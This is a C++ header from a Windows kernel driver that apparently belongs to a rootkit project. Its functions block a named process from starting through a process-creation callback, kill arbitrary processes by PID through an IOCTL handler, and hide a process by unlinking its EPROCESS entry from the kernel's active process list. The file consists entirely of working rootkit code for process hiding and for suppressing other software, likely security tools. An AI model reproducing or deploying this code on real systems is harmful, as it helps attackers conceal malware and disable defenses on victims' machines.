#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "WinTypes.hpp"

/**
 * Checks whether a process with the given pid exists and returns a pointer to the EPROCESS object
 *
 * @param pid Pid of the process to check
 * @returns PEPROCESS pointer to the EPROCESS object or NULL if not existing
 */
PEPROCESS
BeGetEprocessByPid(ULONG pid)
{
    PEPROCESS process;
    if (PsLookupProcessByProcessId(ULongToHandle(pid), &process) != 0)
    {
        DbgPrint("PID %i not found \r\n", (ULONG)pid);
        return NULL;
    }
    return process;
}

/**
 * "Burying" functionality - this is callback on process creation that blocks the specified process from being recreated.
 *
 * @param Process A pointer to the EPROCESS structure for the process.
 * @param ProcessId The process ID of the process.
 * @param CreateInfo If this parameter is non-NULL, a new process is being created, and CreateInfo points to a PS_CREATE_NOTIFY_INFO structure that describes the new process. If this parameter is NULL, the specified process is exiting.
 */
VOID
BeBury_ProcessNotifyRoutineEx(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    UNREFERENCED_PARAMETER(Process);

    if (CreateInfo) // If new process is created ...
    {
        // ... and its the one we want to bury ...
        DbgPrint("Process Creation %i: %wZ \r\n", (ULONG)ProcessId, CreateInfo->ImageFileName);

        if (BeGlobals::buryProcess.beBuryTargetProcessName != NULL && *BeGlobals::buryProcess.beBuryTargetProcessName != '\0')
        {
            if (wcsstr(
                CreateInfo->ImageFileName->Buffer,
                BeGlobals::buryProcess.beBuryTargetProcessName
            ) != NULL) // check for substr
            {
                DbgPrint("Blocking buried process from starting. \r\n");
                // ... then block it by setting the creation status to denied
                CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
                return;
            }
        }
    }
}

/**
 * Kills a process by PID.
 *
 * @param pid PID of the process to kill
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlKillProcess(HANDLE pid)
{
    HANDLE hProcess = NULL;

    if (BeGetEprocessByPid(HandleToULong(pid)) == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    CLIENT_ID ci;
    ci.UniqueProcess = pid;
    ci.UniqueThread = 0;

    OBJECT_ATTRIBUTES obj;
    obj.Length = sizeof(obj);
    obj.Attributes = 0;
    obj.ObjectName = 0;
    obj.RootDirectory = 0;
    obj.SecurityDescriptor = 0;
    obj.SecurityQualityOfService = 0;

    ZwOpenProcess(&hProcess, 1, &obj, &ci);
    NTSTATUS NtStatus = ZwTerminateProcess(hProcess, 0);
    ZwClose(hProcess);

    DbgPrint("KillProcess %i \r\n", NtStatus);
    return NtStatus;
}

/**
 * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlHideProcess(HANDLE pid)
{
    PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
    if (targetProcess == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }
    PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
    RemoveEntryList(processListEntry);
    return STATUS_SUCCESS;
}